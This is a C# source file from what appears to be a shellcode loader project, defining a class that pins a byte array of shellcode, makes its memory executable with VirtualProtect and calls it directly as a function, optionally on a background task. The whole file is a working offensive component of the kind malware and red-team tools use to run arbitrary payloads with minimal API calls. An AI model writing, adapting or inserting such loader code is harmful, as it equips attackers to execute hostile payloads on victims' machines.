using Microsoft.Win32.SafeHandles;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using static ShellCodeLoader.Shared;

namespace ShellCodeLoader
{
    public class ShellCodeLoaderMinimalNativeAPI : IDisposable
    {
        private byte[] ShellCode;
        private uint RegionSize;
        /// <summary>
        /// Default is false.
        /// </summary>
        public bool Asynchronous { get; set; }


        public ShellCodeLoaderMinimalNativeAPI(byte[] shellCode)
        {
            this.ShellCode = shellCode;
            this.RegionSize = (uint)shellCode.Length;
            this.Asynchronous = false;
        }

        public void LoadWithMinimalAPI() 
        {
            if (this.Asynchronous)
            {
                Task.Factory.StartNew(() => { MinimalAPI(); }, CancellationToken.None, TaskCreationOptions.None, TaskScheduler.Default);
            }
            else
            {
                MinimalAPI();
            }
        }
        private unsafe void MinimalAPI() 
        {
            fixed(void* ptr = &this.ShellCode[0])
            {
                PageProtection flOld;
                Imports.VirtualProtect((IntPtr)ptr, RegionSize, Shared.PageProtection.PAGE_EXECUTE_READWRITE, out flOld);
                
                ShellCodeCaller s = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer((IntPtr)ptr, typeof(ShellCodeCaller));
                s();
            }
        }
        internal static class Imports
        {

            internal const String KERNEL32 = "kernel32.dll";
            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
            public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, Shared.PageProtection flNewProtect, out Shared.PageProtection lpflOldProtect);
        }

        private bool _disposed = false;

        // Instantiate a SafeHandle instance.
        private SafeHandle _safeHandle = new SafeFileHandle(IntPtr.Zero, true);

        // Public implementation of Dispose pattern callable by consumers.
        public void Dispose() => Dispose(true);

        // Protected implementation of Dispose pattern.
        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
            {
                return;
            }

            if (disposing)
            {
                // Dispose managed state (managed objects).
                _safeHandle?.Dispose();
            }

            _disposed = true;
            GC.SuppressFinalize(this);
        }
    }
}
